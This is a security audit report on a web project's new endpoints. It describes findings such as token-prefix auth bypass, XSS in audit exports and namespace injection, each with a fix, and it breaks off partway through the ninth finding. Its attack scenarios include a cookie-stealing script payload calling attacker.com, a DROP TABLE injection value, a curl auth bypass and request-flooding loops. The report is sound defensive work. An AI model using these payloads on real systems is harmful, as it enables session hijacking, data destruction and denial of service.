# Security Audit Report - New Endpoints & Components
**Project:** ghl-agency-ai
**Date:** 2025-12-28
**Auditor:** Sage-Security
**Scope:** New endpoints and components (audit.ts, blog.ts, tenant-memory.ts, etc.)

---

## Executive Summary

**Total Issues Found:** 15
- **Critical:** 3
- **High:** 5
- **Medium:** 5
- **Low:** 2

### Critical Findings Summary
1. Weak authentication bypass in audit export endpoint
2. No authorization on blog cache clearing (public access)
3. Hardcoded API key exposure in environment

### Immediate Action Required
The audit export endpoint (audit.ts) allows ANY token starting with "admin_" to access sensitive audit logs containing PII. This must be fixed immediately.

---

## Detailed Findings

### 1. CRITICAL - Weak Authentication in Audit Export Endpoint
**File:** `server/api/rest/routes/audit.ts`
**Lines:** 452-459
**Severity:** CRITICAL
**CVSS Score:** 9.1 (Critical)

**Vulnerability:**
```typescript
// For now, accept any token starting with 'admin_'
// TODO: Integrate with actual authentication system
if (!token.startsWith('admin_')) {
  return res.status(403).json({
    error: 'Forbidden',
    message: 'Admin privileges required for this endpoint',
  });
}
```

**Attack Scenario:**
```bash
# Trivial bypass - ANY token starting with admin_ works
curl -H "Authorization: Bearer admin_anything123" \
  http://localhost:5000/api/audit/export?format=csv

# Returns CSV with all user data, emails, IP addresses
```

**Data at Risk:**
- User emails
- IP addresses
- API request details
- Workflow execution data
- Browser session information
- Complete activity timeline

**Impact:**
- GDPR violation (unauthorized PII export)
- SOC 2 compliance failure
- Complete audit log exfiltration
- User privacy breach

**Fix:**
```typescript
import { verifyJWT } from '../../utils/auth';
import { getDb } from '../../../db';
import { users } from '../../../../drizzle/schema';
import { eq } from 'drizzle-orm';

async function requireAdminAuth(req: Request, res: Response, next: express.NextFunction) {
  try {
    const authHeader = req.headers.authorization;

    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({
        error: 'Unauthorized',
        message: 'Authentication required',
      });
    }

    const token = authHeader.substring(7);

    // Verify JWT token
    const payload = await verifyJWT(token);
    if (!payload) {
      return res.status(401).json({
        error: 'Unauthorized',
        message: 'Invalid or expired token',
      });
    }

    // Verify admin role in database
    const db = await getDb();
    if (!db) {
      return res.status(500).json({ error: 'Service unavailable' });
    }

    const [user] = await db
      .select({ id: users.id, role: users.role })
      .from(users)
      .where(eq(users.id, payload.userId))
      .limit(1);

    if (!user || user.role !== 'admin') {
      // Audit log the failed attempt
      await logSecurityEvent({
        type: 'UNAUTHORIZED_AUDIT_ACCESS_ATTEMPT',
        userId: payload.userId,
        ip: req.ip,
        timestamp: new Date(),
      });

      return res.status(403).json({
        error: 'Forbidden',
        message: 'Admin privileges required',
      });
    }

    // Attach user to request for audit logging
    (req as any).user = user;

    // Audit log successful access
    await logSecurityEvent({
      type: 'AUDIT_LOG_ACCESSED',
      userId: user.id,
      ip: req.ip,
      timestamp: new Date(),
    });

    return next();
  } catch (error) {
    console.error('[Audit Export] Auth error:', error);
    return res.status(500).json({
      error: 'Internal Server Error',
      message: 'Authentication failed',
    });
  }
}
```

---

### 2. CRITICAL - No Authorization on Blog Cache Clearing
**File:** `server/api/routers/blog.ts`
**Lines:** 134-148
**Severity:** CRITICAL
**CVSS Score:** 7.5 (High)

**Vulnerability:**
```typescript
/**
 * Clear blog cache (admin operation)
 */
clearCache: publicProcedure.mutation(async () => { // Uses publicProcedure!
  try {
    notionBlogService.clearCache();
    return {
      success: true,
      message: "Blog cache cleared",
    };
  } catch (error) {
    // ...
  }
}),
```

**Attack Scenario:**
```javascript
// Any unauthenticated user can clear cache
await trpc.blog.clearCache.mutate();

// Repeat this attack:
setInterval(() => {
  trpc.blog.clearCache.mutate();
}, 1000); // Clear cache every second

// Result: Expensive Notion API calls on every request
// Cost amplification attack
```

**Impact:**
- Performance degradation (cache constantly invalidated)
- Increased Notion API costs
- Service disruption/DoS
- Poor user experience

**Fix:**
```typescript
import { protectedProcedure } from "../../_core/trpc";
import { TRPCError } from "@trpc/server";

/**
 * Clear blog cache (admin operation)
 */
clearCache: protectedProcedure
  .input(z.object({
    confirmToken: z.string().min(8), // CSRF protection
  }))
  .mutation(async ({ ctx, input }) => {
    // Verify admin role
    if (ctx.user.role !== 'admin') {
      throw new TRPCError({
        code: 'FORBIDDEN',
        message: 'Admin privileges required to clear blog cache',
      });
    }

    // Additional rate limiting
    const cacheKey = `cache-clear:${ctx.user.id}`;
    const recentClears = await redis.get(cacheKey);
    if (recentClears && parseInt(recentClears) > 5) {
      throw new TRPCError({
        code: 'TOO_MANY_REQUESTS',
        message: 'Cache clear rate limit exceeded. Max 5 clears per hour.',
      });
    }

    try {
      notionBlogService.clearCache();

      // Audit log
      await db.insert(adminAuditLogs).values({
        userId: ctx.user.id,
        action: 'BLOG_CACHE_CLEARED',
        timestamp: new Date(),
        ipAddress: ctx.req.ip,
      });

      // Track clears for rate limiting
      await redis.incr(cacheKey);
      await redis.expire(cacheKey, 3600); // 1 hour

      return {
        success: true,
        message: "Blog cache cleared successfully",
      };
    } catch (error) {
      console.error("[Blog Router] clearCache error:", error);
      throw new TRPCError({
        code: 'INTERNAL_SERVER_ERROR',
        message: 'Failed to clear cache',
      });
    }
  }),
```

---

### 3. CRITICAL - Hardcoded API Key Exposure
**File:** `server/services/notion-blog.service.ts`
**Lines:** 33-36
**Severity:** CRITICAL
**CVSS Score:** 9.8 (Critical)

**Vulnerability:**
```typescript
const apiKey = process.env.NOTION_API_KEY;
if (!apiKey) {
  throw new Error("NOTION_API_KEY environment variable is not set");
}
notionClient = new Client({ auth: apiKey });
```

**Risks:**
1. If `.env` file is committed to git → API key in history forever
2. No rotation mechanism → compromised key hard to replace
3. Error message reveals secret configuration
4. Plain text in environment variables (not encrypted)
5. Shared across all services (no key scoping)

**Verification:**
```bash
# Check if .env was ever committed
git log --all --full-history --source -- .env
git log --all --full-history --source -- .env.local

# Search for NOTION_API_KEY in git history
git grep -i "NOTION_API_KEY" $(git rev-list --all)
```

**Impact:**
- Complete Notion workspace access
- Blog content modification/deletion
- Access to potentially sensitive Notion pages
- Permanent compromise if key leaked to git history

**Fix:**
```typescript
import { getSecret } from '../utils/secretsManager';

let notionClient: Client | null = null;
let lastKeyRefresh: number = 0;
const KEY_REFRESH_INTERVAL = 3600000; // 1 hour

async function getNotionClient(): Promise<Client> {
  const now = Date.now();

  // Refresh key periodically from secret store
  if (!notionClient || (now - lastKeyRefresh > KEY_REFRESH_INTERVAL)) {
    try {
      // Retrieve from AWS Secrets Manager / HashiCorp Vault
      const apiKey = await getSecret('notion/blog-api-key');

      if (!apiKey) {
        throw new Error("Failed to retrieve Notion API configuration");
      }

      notionClient = new Client({ auth: apiKey });
      lastKeyRefresh = now;

      console.log('[NotionBlog] API client initialized');
    } catch (error) {
      console.error('[NotionBlog] Failed to initialize client:', error);
      throw new Error("Notion client initialization failed");
    }
  }

  return notionClient;
}

// Implement key rotation
export async function rotateNotionApiKey(): Promise<void> {
  console.log('[NotionBlog] Starting API key rotation');

  try {
    // 1. Generate new key in Notion workspace
    const newKey = await generateNewNotionKey();

    // 2. Store in secret manager
    await updateSecret('notion/blog-api-key', newKey);

    // 3. Update database record
    await db.insert(secretRotationLog).values({
      secretName: 'notion-api-key',
      rotatedAt: new Date(),
      rotatedBy: 'automated',
    });

    // 4. Force client recreation
    notionClient = null;
    lastKeyRefresh = 0;

    console.log('[NotionBlog] API key rotation successful');
  } catch (error) {
    console.error('[NotionBlog] API key rotation failed:', error);
    throw error;
  }
}
```

**AWS Secrets Manager Implementation:**
```typescript
// server/utils/secretsManager.ts
import {
  SecretsManagerClient,
  GetSecretValueCommand,
  PutSecretValueCommand,
} from '@aws-sdk/client-secrets-manager';

const client = new SecretsManagerClient({
  region: process.env.AWS_REGION || 'us-east-1',
});

export async function getSecret(secretName: string): Promise<string> {
  try {
    const response = await client.send(
      new GetSecretValueCommand({
        SecretId: secretName,
      })
    );

    return response.SecretString || '';
  } catch (error) {
    console.error(`Failed to retrieve secret ${secretName}:`, error);
    throw new Error('Secret retrieval failed');
  }
}

export async function updateSecret(secretName: string, value: string): Promise<void> {
  try {
    await client.send(
      new PutSecretValueCommand({
        SecretId: secretName,
        SecretString: value,
      })
    );
  } catch (error) {
    console.error(`Failed to update secret ${secretName}:`, error);
    throw new Error('Secret update failed');
  }
}
```

---

### 4. HIGH - SQL Injection Risk in Date Parsing
**File:** `server/api/rest/routes/audit.ts`
**Lines:** 66-67, 494-495
**Severity:** HIGH
**CVSS Score:** 7.3

**Vulnerability:**
```typescript
// User input passed directly to Date constructor
const startDate = params.startDate ? new Date(params.startDate) : null;
const endDate = params.endDate ? new Date(params.endDate) : null;

// No validation that endDate > startDate
// No validation of date format
// Invalid dates cause queries to fail
```

**Attack Scenarios:**
```bash
# Invalid date causes database error
curl "http://api/audit/export?format=csv&startDate=invalid"

# Future dates bypass data filters
curl "http://api/audit/export?format=csv&startDate=2099-01-01"

# Malformed dates reveal database structure in errors
curl "http://api/audit/export?format=csv&startDate=;DROP TABLE users;--"
```

**Impact:**
- Error-based information disclosure
- Logic bypass (invalid date ranges)
- DoS via malformed dates
- Potential SQL injection if dates used in raw queries

**Fix:**
```typescript
import { z } from 'zod';

const dateSchema = z.string().datetime().optional();

const auditExportSchema = z.object({
  format: z.enum(['csv', 'pdf']),
  userId: z.string().regex(/^\d+$/).optional(),
  eventType: z.enum(['all', 'api_request', 'workflow', 'browser_session', 'job', 'user_signin']).optional(),
  startDate: dateSchema,
  endDate: dateSchema,
  sortOrder: z.enum(['asc', 'desc']).default('desc'),
});

function validateAndParseDates(params: z.infer<typeof auditExportSchema>): {
  startDate: Date | null;
  endDate: Date | null;
} {
  let startDate: Date | null = null;
  let endDate: Date | null = null;

  if (params.startDate) {
    startDate = new Date(params.startDate);

    // Validate date is valid
    if (isNaN(startDate.getTime())) {
      throw new Error('Invalid startDate format. Use ISO 8601 (YYYY-MM-DDTHH:mm:ssZ)');
    }

    // Prevent unreasonable dates
    const minDate = new Date('2000-01-01');
    const maxDate = new Date();
    maxDate.setFullYear(maxDate.getFullYear() + 1);

    if (startDate < minDate || startDate > maxDate) {
      throw new Error('startDate must be between 2000-01-01 and 1 year in the future');
    }
  }

  if (params.endDate) {
    endDate = new Date(params.endDate);

    if (isNaN(endDate.getTime())) {
      throw new Error('Invalid endDate format. Use ISO 8601 (YYYY-MM-DDTHH:mm:ssZ)');
    }

    const minDate = new Date('2000-01-01');
    const maxDate = new Date();
    maxDate.setFullYear(maxDate.getFullYear() + 1);

    if (endDate < minDate || endDate > maxDate) {
      throw new Error('endDate must be between 2000-01-01 and 1 year in the future');
    }
  }

  // Validate logical date range
  if (startDate && endDate && startDate > endDate) {
    throw new Error('startDate must be before endDate');
  }

  // Prevent excessively large date ranges (DoS protection)
  if (startDate && endDate) {
    const rangeMs = endDate.getTime() - startDate.getTime();
    const maxRangeMs = 365 * 24 * 60 * 60 * 1000; // 1 year

    if (rangeMs > maxRangeMs) {
      throw new Error('Date range cannot exceed 1 year');
    }
  }

  return { startDate, endDate };
}

// Usage in route
router.get('/export', requireAdminAuth, async (req: Request, res: Response) => {
  try {
    // Validate input
    const params = auditExportSchema.parse({
      format: req.query.format,
      userId: req.query.userId,
      eventType: req.query.eventType,
      startDate: req.query.startDate,
      endDate: req.query.endDate,
      sortOrder: req.query.sortOrder,
    });

    // Validate and parse dates
    const { startDate, endDate } = validateAndParseDates(params);

    // ... rest of implementation
  } catch (error) {
    if (error instanceof z.ZodError) {
      return res.status(400).json({
        error: 'Bad Request',
        message: 'Invalid query parameters',
        details: error.errors,
      });
    }

    if (error instanceof Error) {
      return res.status(400).json({
        error: 'Bad Request',
        message: error.message,
      });
    }

    return res.status(500).json({
      error: 'Internal Server Error',
      message: 'Request processing failed',
    });
  }
});
```

---

### 5. HIGH - XSS Vulnerability in HTML/PDF Generation
**File:** `server/api/rest/routes/audit.ts`
**Lines:** 338-425
**Severity:** HIGH
**CVSS Score:** 8.2

**Vulnerability:**
User-controlled data injected directly into HTML without escaping:
```typescript
function generatePDFHTML(entries: AuditEntry[]): string {
  const html = `
    ${entries.map(entry => `
      <tr>
        <td>${entry.userName || 'System'}</td>
        <td>${entry.userEmail || 'N/A'}</td>
        <td>${entry.action}</td>
        <td>${entry.details}</td>
      </tr>
    `).join('')}
  `;
  return html;
}
```

**Attack Scenario:**
```javascript
// Attacker creates user with malicious name
POST /api/users {
  "name": "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>",
  "email": "attacker@example.com"
}

// Admin exports audit logs
GET /api/audit/export?format=pdf
// Opens HTML in browser → XSS executes → Admin session stolen
```

**Impact:**
- Reflected/Stored XSS on admin users
- Session hijacking via cookie theft
- Admin account compromise
- Malicious actions performed as admin

**Fix:**
```typescript
// HTML escaping function
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function generatePDFHTML(entries: AuditEntry[]): string {
  const now = escapeHtml(new Date().toISOString());

  const html = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; object-src 'none'; base-uri 'none';">
  <title>Audit Log Export - ${now}</title>
  <style>
    /* Safe CSS only - no user input */
    body {
      font-family: Arial, sans-serif;
      margin: 20px;
      font-size: 12px;
    }
    /* ... other styles ... */
  </style>
</head>
<body>
  <h1>Audit Log Export</h1>
  <div class="meta">
    <p><strong>Generated:</strong> ${now}</p>
    <p><strong>Total Entries:</strong> ${entries.length}</p>
  </div>

  <table>
    <thead>
      <tr>
        <th>Timestamp</th>
        <th>Type</th>
        <th>User</th>
        <th>Email</th>
        <th>Action</th>
        <th>Details</th>
        <th>IP Address</th>
      </tr>
    </thead>
    <tbody>
      ${entries.map(entry => `
        <tr>
          <td class="timestamp">${escapeHtml(entry.timestamp.toISOString())}</td>
          <td class="type">${escapeHtml(entry.type)}</td>
          <td>${escapeHtml(entry.userName || 'System')}</td>
          <td>${escapeHtml(entry.userEmail || 'N/A')}</td>
          <td>${escapeHtml(entry.action)}</td>
          <td>${escapeHtml(entry.details)}</td>
          <td>${escapeHtml(entry.ipAddress || 'N/A')}</td>
        </tr>
      `).join('')}
    </tbody>
  </table>
</body>
</html>
  `.trim();

  return html;
}
```

**CSV Injection Protection:**
```typescript
function escapeCsvValue(value: string): string {
  // Prevent CSV formula injection (Excel/Google Sheets vulnerability)
  if (value.startsWith('=') || value.startsWith('+') ||
      value.startsWith('-') || value.startsWith('@') ||
      value.startsWith('\t') || value.startsWith('\r')) {
    value = "'" + value; // Prepend single quote to prevent formula execution
  }

  // Escape quotes and wrap if contains special characters
  if (value.includes(',') || value.includes('\n') || value.includes('"')) {
    return `"${value.replace(/"/g, '""')}"`;
  }

  return value;
}

function generateCSV(entries: AuditEntry[]): string {
  const csvData = entries.map(entry => ({
    Timestamp: escapeCsvValue(entry.timestamp.toISOString()),
    Type: escapeCsvValue(entry.type),
    User: escapeCsvValue(entry.userName || 'System'),
    Email: escapeCsvValue(entry.userEmail || 'N/A'),
    Action: escapeCsvValue(entry.action),
    Details: escapeCsvValue(entry.details),
    'IP Address': escapeCsvValue(entry.ipAddress || 'N/A'),
  }));

  const headers = Object.keys(csvData[0] || {});
  const csvRows = [
    headers.join(','),
    ...csvData.map(row =>
      headers.map(header => row[header as keyof typeof row]).join(',')
    )
  ];

  return csvRows.join('\n');
}
```

---

### 6. HIGH - Missing Rate Limiting on Public Blog Endpoints
**File:** `server/api/routers/blog.ts`
**Lines:** 14-130
**Severity:** HIGH
**CVSS Score:** 7.5

**Vulnerability:**
```typescript
getPosts: publicProcedure
  .input(
    z.object({
      limit: z.number().min(1).max(50).default(10), // Client can request up to 50
      cursor: z.string().optional(),
      category: z.string().optional(),
      tag: z.string().optional(),
      search: z.string().optional(), // No length limit!
    }).optional()
  )
  .query(async ({ input }) => {
    // No rate limiting
    // Expensive Notion API call on cache miss
    // Search filter applied AFTER fetching data
```

**Attack Scenarios:**
```bash
# Scenario 1: Cache bypass attack
for i in {1..1000}; do
  curl "http://api/blog/posts?search=unique_${i}" &
done
# Each request misses cache → 1000 Notion API calls

# Scenario 2: Pagination abuse
for page in {1..100}; do
  curl "http://api/blog/posts?limit=50&cursor=${page}" &
done
# Fetch maximum allowed data repeatedly

# Scenario 3: Long search string DoS
curl "http://api/blog/posts?search=$(python -c 'print("x"*1000000)')"
# No length limit on search parameter
```

**Impact:**
- Notion API rate limit exhaustion
- Increased infrastructure costs
- Service degradation
- DoS via expensive operations

**Fix:**
```typescript
import { TRPCError } from '@trpc/server';
import { Redis } from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);

// Rate limiting helper
async function checkRateLimit(clientIp: string, endpoint: string): Promise<void> {
  const key = `rate-limit:${endpoint}:${clientIp}`;
  const requests = await redis.incr(key);

  if (requests === 1) {
    await redis.expire(key, 60); // 1 minute window
  }

  if (requests > 30) { // 30 requests per minute
    throw new TRPCError({
      code: 'TOO_MANY_REQUESTS',
      message: 'Rate limit exceeded. Please try again later.',
    });
  }
}

export const blogRouter = router({
  getPosts: publicProcedure
    .input(
      z.object({
        limit: z.number().min(1).max(20).default(10), // Reduced from 50 to 20
        cursor: z.string().max(200).optional(), // Limit cursor length
        category: z.string().max(50).optional(), // Limit category length
        tag: z.string().max(50).optional(), // Limit tag length
        search: z.string().min(1).max(100).optional(), // ADD LENGTH LIMIT
      }).optional()
    )
    .query(async ({ input, ctx }) => {
      // Get client IP from context
      const clientIp = ctx.req.ip || ctx.req.headers['x-forwarded-for'] || 'unknown';

      // Check rate limit
      await checkRateLimit(clientIp, 'blog:getPosts');

      try {
        // Sanitize search input
        const search = input?.search?.trim();
        if (search && search.length < 2) {
          throw new TRPCError({
            code: 'BAD_REQUEST',
            message: 'Search query must be at least 2 characters',
          });
        }

        const result = await notionBlogService.getPosts({
          limit: Math.min(input?.limit || 10, 20), // Enforce server-side
          cursor: input?.cursor,
          category: input?.category,
          tag: input?.tag,
          search,
        });

        return {
          success: true,
          posts: result.posts,
          hasMore: result.hasMore,
          nextCursor: result.nextCursor,
        };
      } catch (error) {
        console.error("[Blog Router] getPosts error:", error);

        if (error instanceof TRPCError) {
          throw error;
        }

        throw new TRPCError({
          code: 'INTERNAL_SERVER_ERROR',
          message: 'Failed to fetch blog posts',
        });
      }
    }),

  getPost: publicProcedure
    .input(
      z.object({
        slug: z.string().min(1).max(200).regex(/^[a-z0-9-]+$/), // Validate slug format
      })
    )
    .query(async ({ input, ctx }) => {
      const clientIp = ctx.req.ip || 'unknown';
      await checkRateLimit(clientIp, 'blog:getPost');

      try {
        const post = await notionBlogService.getPostBySlug(input.slug);

        if (!post) {
          throw new TRPCError({
            code: 'NOT_FOUND',
            message: 'Blog post not found',
          });
        }

        return {
          success: true,
          post,
        };
      } catch (error) {
        console.error("[Blog Router] getPost error:", error);

        if (error instanceof TRPCError) {
          throw error;
        }

        throw new TRPCError({
          code: 'INTERNAL_SERVER_ERROR',
          message: 'Failed to fetch blog post',
        });
      }
    }),

  // Categories and tags - less frequent, lower limit
  getCategories: publicProcedure.query(async ({ ctx }) => {
    const clientIp = ctx.req.ip || 'unknown';
    await checkRateLimit(clientIp, 'blog:getCategories');
    // ... rest of implementation
  }),

  getTags: publicProcedure.query(async ({ ctx }) => {
    const clientIp = ctx.req.ip || 'unknown';
    await checkRateLimit(clientIp, 'blog:getTags');
    // ... rest of implementation
  }),
});
```

**Additional: Cache stampede protection**
```typescript
// In notion-blog.service.ts
private pendingRequests = new Map<string, Promise<any>>();

async getPosts(filters?: BlogFilters): Promise<BlogListResponse> {
  const cacheKey = `posts:${JSON.stringify(filters || {})}`;

  // Check cache
  const cached = getCached<BlogListResponse>(cacheKey);
  if (cached) return cached;

  // Check if request is already in progress (prevent cache stampede)
  if (this.pendingRequests.has(cacheKey)) {
    return this.pendingRequests.get(cacheKey)!;
  }

  // Create promise and store it
  const promise = this.fetchPostsFromNotion(filters);
  this.pendingRequests.set(cacheKey, promise);

  try {
    const result = await promise;
    setCache(cacheKey, result);
    return result;
  } finally {
    this.pendingRequests.delete(cacheKey);
  }
}
```

---

### 7. HIGH - Potential DoS via Unlimited Memory Allocation
**File:** `server/mcp/tenant-memory.ts`
**Lines:** 145-204, 384-387
**Severity:** HIGH
**CVSS Score:** 7.5

**Vulnerability:**
```typescript
async set(
  namespace: string,
  key: string,
  value: any, // NO size validation before serialization
  options?: {
    ttl?: number;
    metadata?: Record<string, unknown>;
  }
): Promise<void> {
  // ...
  const size = this.calculateSize(value); // Can crash here
  // ...
}

private calculateSize(value: any): number {
  const json = JSON.stringify(value); // Can throw on circular refs
  return Buffer.byteLength(json, 'utf8'); // Can cause OOM
}
```

**Attack Scenarios:**
```javascript
// Scenario 1: Circular reference crash
const circular = { a: {} };
circular.a = circular;
await tenantMemory.set('ns', 'key', circular);
// Throws: "Converting circular structure to JSON"

// Scenario 2: Memory exhaustion
const huge = { data: 'x'.repeat(10 * 1024 * 1024) }; // 10MB string
await tenantMemory.set('ns', 'key', huge);
// JSON.stringify() allocates 10MB+ in memory BEFORE quota check

// Scenario 3: Deeply nested object
const deep = {};
let current = deep;
for (let i = 0; i < 10000; i++) {
  current.next = {};
  current = current.next;
}
await tenantMemory.set('ns', 'key', deep);
// Stack overflow or excessive recursion
```

**Impact:**
- Service crash via circular reference exception
- Memory exhaustion DoS
- Quota bypass (OOM before quota check)
- Process crash affects all tenants

**Fix:**
```typescript
// Add safe size estimation before expensive operations
function estimateObjectSize(
  value: any,
  maxDepth: number = 20,
  currentDepth: number = 0,
  seen: WeakSet<object> = new WeakSet()
): number {
  // Prevent excessive recursion
  if (currentDepth > maxDepth) {
    throw new Error(`Object depth exceeds maximum allowed (${maxDepth})`);
  }

  // Handle primitives
  if (value === null || value === undefined) return 4;

  const type = typeof value;

  if (type === 'boolean') return 4;
  if (type === 'number') return 8;
  if (type === 'string') return value.length * 2;

  // Handle arrays
  if (Array.isArray(value)) {
    let size = 0;
    for (const item of value) {
      size += estimateObjectSize(item, maxDepth, currentDepth + 1, seen);
    }
    return size;
  }

  // Handle objects
  if (type === 'object') {
    // Detect circular references
    if (seen.has(value)) {
      throw new Error('Circular reference detected in value');
    }
    seen.add(value);

    let size = 0;
    for (const key in value) {
      if (value.hasOwnProperty(key)) {
        size += key.length * 2; // Key size
        size += estimateObjectSize(value[key], maxDepth, currentDepth + 1, seen);
      }
    }

    return size;
  }

  return 0;
}

async set(
  namespace: string,
  key: string,
  value: any,
  options?: {
    ttl?: number;
    metadata?: Record<string, unknown>;
  }
): Promise<void> {
  const tenantService = getTenantService();
  const context = tenantService.requireTenantContext();

  // Check rate limits first
  await this.checkRateLimit(context.tenantId);

  // SECURITY: Estimate size BEFORE expensive operations
  const quota = this.getQuota(context.tenantId);

  let estimatedSize: number;
  try {
    estimatedSize = estimateObjectSize(value);
  } catch (error) {
    if (error instanceof Error) {
      if (error.message.includes('Circular reference')) {
        throw new Error('Cannot store values with circular references');
      }
      if (error.message.includes('depth exceeds')) {
        throw new Error('Object structure too deeply nested (max 20 levels)');
      }
    }
    throw new Error('Failed to validate value structure');
  }

  // Quick reject if estimated size exceeds quota
  if (estimatedSize > quota.maxEntrySize) {
    throw new Error(
      `Estimated entry size (~${estimatedSize} bytes) exceeds maximum (${quota.maxEntrySize} bytes)`
    );
  }

  const fullKey = this.generateKey(context.tenantId, context.userId, namespace, key);

  // Calculate actual size with timeout protection
  let actualSize: number;
  try {
    // Use a safe serializer with timeout
    const json = await this.safeStringify(value, 5000); // 5 second timeout
    actualSize = Buffer.byteLength(json, 'utf8');
  } catch (error) {
    console.error('[TenantMemory] Serialization failed:', error);
    throw new Error('Failed to serialize value. Check for circular references or invalid data types.');
  }

  // Verify actual size within quota
  if (actualSize > quota.maxEntrySize) {
    throw new Error(
      `Entry size (${actualSize} bytes) exceeds maximum (${quota.maxEntrySize} bytes)`
    );
  }

  // Check storage quota
  await this.checkQuotas(context.tenantId, namespace, actualSize);

  const ttl = options?.ttl || quota.defaultTTL;
  const finalTTL = Math.min(ttl, quota.maxTTL);

  const entry: MemoryEntry = {
    key: fullKey,
    value,
    namespace,
    tenantId: context.tenantId,
    userId: context.userId,
    createdAt: new Date(),
    updatedAt: new Date(),
    expiresAt: new Date(Date.now() + finalTTL * 1000),
    size: actualSize,
    metadata: options?.metadata,
  };

  // Remove old entry from stats if exists
  const oldEntry = this.storage.get(fullKey);
  if (oldEntry) {
    this.updateUsageStats(context.tenantId, -oldEntry.size, 0);
  }

  this.storage.set(fullKey, entry);
  this.updateUsageStats(context.tenantId, actualSize, oldEntry ? 0 : 1);
  this.logOperation(context.tenantId);

  this.emit('set', { tenantId: context.tenantId, namespace, key, size: actualSize });
}

// Safe stringify with timeout
private async safeStringify(value: any, timeoutMs: number): Promise<string> {
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      reject(new Error('Serialization timeout'));
    }, timeoutMs);

    try {
      const json = JSON.stringify(value);
      clearTimeout(timeout);
      resolve(json);
    } catch (error) {
      clearTimeout(timeout);
      reject(error);
    }
  });
}
```

---

### 8. HIGH - Missing Input Validation on Tenant Namespace
**File:** `server/mcp/tenant-memory.ts`
**Lines:** 137-146
**Severity:** HIGH
**CVSS Score:** 7.4

**Vulnerability:**
```typescript
getTenantNamespace(namespace: string, includeUserId = true): string {
  const context = this.requireTenantContext();
  const prefix = this.config.namespacePrefix;

  if (includeUserId) {
    return `${prefix}:${context.tenantId}:user:${context.userId}:${namespace}`;
  }

  return `${prefix}:${context.tenantId}:${namespace}`;
}
```

**Attack Scenarios:**
```javascript
// Scenario 1: Namespace injection
await tenantMemory.set('../../other-tenant:data', 'key', 'value');
// Results in: tenant:myTenant:user:123:../../other-tenant:data:key
// Could potentially access parent namespaces

// Scenario 2: Collision attack
await tenantMemory.set('user:456:sneaky', 'key', 'value');
// Results in: tenant:myTenant:user:123:user:456:sneaky:key
// Looks like data from user 456

// Scenario 3: Reserved keyword abuse
await tenantMemory.set('system', 'config', 'malicious');
// Could conflict with system namespaces
```

**Impact:**
- Namespace collision
- Potential cross-tenant data access
- Cache poisoning
- Authorization bypass

**Fix:**
```typescript
// Strict namespace validation
private validateNamespace(namespace: string): void {
  // Reject empty or non-string
  if (!namespace || typeof namespace !== 'string') {
    throw new Error('Namespace must be a non-empty string');
  }

  // Enforce length limits
  if (namespace.length < 1 || namespace.length > 100) {
    throw new Error('Namespace length must be between 1 and 100 characters');
  }

  // Only allow alphanumeric, hyphens, underscores
  if (!/^[a-zA-Z0-9_-]+$/.test(namespace)) {
    throw new Error(
      'Invalid namespace: only letters, numbers, hyphens, and underscores allowed'
    );
  }

  // Prevent path traversal
  if (namespace.includes('..') || namespace.includes('./') || namespace.includes('\\')) {
    throw new Error('Invalid namespace: path traversal characters not allowed');
  }

  // Reject reserved keywords
  const reserved = [
    'admin',
    'system',
    'config',
    'internal',
    'root',
    'user',
    'tenant',
    'global',
    'cache',
    'session',
  ];

  if (reserved.includes(namespace.toLowerCase())) {
    throw new Error(`Namespace '${namespace}' is reserved and cannot be used`);
  }

  // Prevent numeric-only namespaces (could be confused with IDs)
  if (/^\d+$/.test(namespace)) {
    throw new Error('Namespace cannot be numeric only');
  }
}

// Validate tenant ID format
private validateTenantId(tenantId: string): void {
  if (!tenantId || typeof tenantId !== 'string') {
    throw new Error('Invalid tenant ID');
  }

  // Only allow safe characters
  if (!/^[a-zA-Z0-9_-]+$/.test(tenantId)) {
    throw new Error('Invalid tenant ID format');
  }

  if (tenantId.length > 100) {
    throw new Error('Tenant ID too long');
  }
}

getTenantNamespace(namespace: string, includeUserId = true): string {
  // SECURITY: Validate inputs
  this.validateNamespace(namespace);

  const context = this.requireTenantContext();

  // SECURITY: Validate tenant ID
  this.validateTenantId(context.tenantId);

  // SECURITY: Validate user ID is positive integer
  if (!Number.isInteger(context.userId) || context.userId < 1) {
    throw new Error('Invalid user ID');
  }

  const prefix = this.config.namespacePrefix || 'tenant';

  if (includeUserId) {
    return `${prefix}:${context.tenantId}:user:${context.userId}:${namespace}`;
  }

  return `${prefix}:${context.tenantId}:${namespace}`;
}

// Also validate when generating keys
getTenantMemoryKey(key: string): string {
  this.validateNamespace(key); // Reuse validation

  const context = this.requireTenantContext();
  this.validateTenantId(context.tenantId);

  if (!Number.isInteger(context.userId) || context.userId < 1) {
    throw new Error('Invalid user ID');
  }

  return `${this.config.namespacePrefix}:${context.tenantId}:${context.userId}:${key}`;
}
```

---

### 9. MEDIUM - Sensitive Data Exposure in Error Messages
**File:** `server/services/agentPermissions.service.ts`
**Lines:** 262-268
**Severity:** MEDIUM
**CVSS Score:** 5.3

**Vulnerability:**
```typescript
if (!apiKeyRecord || !apiKeyRecord.isActive) {
  return {
    allowed: false,
    reason: "API key is invalid or inactive", // Reveals API key state
    permissionLevel,
    toolCategory,
  };
}
```

**Information Leakage:**
```bash
# Attacker can enumerate valid API keys
curl -H "Authorization: Bearer ghl_fake123" /api/execute
# Response: "API key is invalid or inactive"

curl -H "Authorization: Bearer ghl_real123" /api/execute
# Response: "API key is invalid or inactive" (exists but inactive)

curl -H "Authorization: Bearer ghl_active123" /api/execute
# Response: "Permission denied" (exists and active)

# Attacker now knows ghl_active123 is valid
```

**Impact:**
- API key enumeration
- Reduces brute force attack complexity
- Aids targeted attacks

**Fix:**
```typescript
async checkToolExecutionPermission(
  userId: number,
  toolName: string,
  apiKeyId?: number
): Promise<PermissionCheckResult> {
  const db = await getDb();
  if (!db) {
    throw new Error("Database not initialized");
  }

  const permissionLevel = await this.getUserPermissionLevel(userId);
  const toolCategory = this.getToolCategory(toolName);

  // If using API key, check scopes
  if (apiKeyId) {
    const [apiKeyRecord] = await db
